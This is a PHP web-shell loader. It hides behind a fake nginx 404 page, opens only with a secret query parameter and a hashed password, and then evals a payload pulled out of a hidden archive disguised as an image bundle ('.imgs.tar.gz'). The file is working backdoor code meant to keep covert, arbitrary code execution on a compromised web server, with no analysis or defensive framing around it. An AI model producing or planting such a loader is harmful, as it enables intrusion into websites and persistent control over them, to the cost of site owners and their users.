<?php
@session_start();
@set_time_limit(0);
@clearstatcache();
error_reporting(0);
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('display_errors', 0);

$trigger_key = 'p';
$trigger_val = '1';

$hash_legacy = 'a45d926a66c7bc36934b3fb61e12a60e86ee44190c4df8ca0d4213501d749a66e19d016e9bcc0ba5432d6f6d0a26cc10b9e484f4106a708b88aba49e7403ed7d';
$salt_legacy = 'RjL';

$max_tries = 5;
$lock_time = 900;
$auth_ok = isset($_SESSION['ok']) ? $_SESSION['ok'] : false;

if (isset($_GET['out'])) { session_destroy(); header("Location: ?"); exit; }

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['k'])) {
    $lock = isset($_SESSION['l']) ? $_SESSION['l'] : 0;
    $pwd = $_POST['k'];
    
    $is_valid = (hash('sha512', $salt_legacy . $pwd) === $hash_legacy);

    if (time() < $lock) {
        $err = true;
    } elseif ($is_valid) {
        $_SESSION['ok'] = true; 
        unset($_SESSION['t']); unset($_SESSION['l']);
        header("Location: ?"); exit;
    } else {
        $t = isset($_SESSION['t']) ? $_SESSION['t'] + 1 : 1;
        $_SESSION['t'] = $t;
        if ($t >= $max_tries) { $_SESSION['l'] = time() + $lock_time; }
        $err = true;
    }
}

if (!$auth_ok) {
    $req_val = isset($_GET[$trigger_key]) ? $_GET[$trigger_key] : '';

    if ($req_val !== $trigger_val) {
        header("HTTP/1.0 404 Not Found");
        echo "<html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center><hr><center>nginx</center></body></html>";
        exit;
    }
    
    ?>
    <!DOCTYPE html><html><head><meta name="robots" content="noindex,nofollow">
    <style>body{background:#0a0a0a;display:flex;height:100vh;margin:0;align-items:center;justify-content:center}
    form{padding:10px}input{background:#111;border:1px solid #222;color:#444;padding:8px;outline:none;width:250px;text-align:center}</style></head>
    <body><form method="POST"><input type="password" name="k" autofocus autocomplete="off"></form></body></html>
    <?php exit; 
}

if (!class_exists('PharData')) {
    die("❌ Ekstensi Phar tidak aktif di server ini");
}

$tarFile = '.imgs.tar.gz';
$fileInside = 'ews.php'; 

try {
    $phar = new PharData($tarFile);

    $content = @file_get_contents("phar://{$tarFile}/{$fileInside}");

    if ($content !== false && !empty($content)) {
        eval('?>' . $content);
    } else {
        echo "❌ Gagal membaca atau menemukan file '{$fileInside}' di dalam {$tarFile}.";
    }
} catch (Exception $e) {
    echo "❌ Terjadi kesalahan: " . $e->getMessage();
}
?>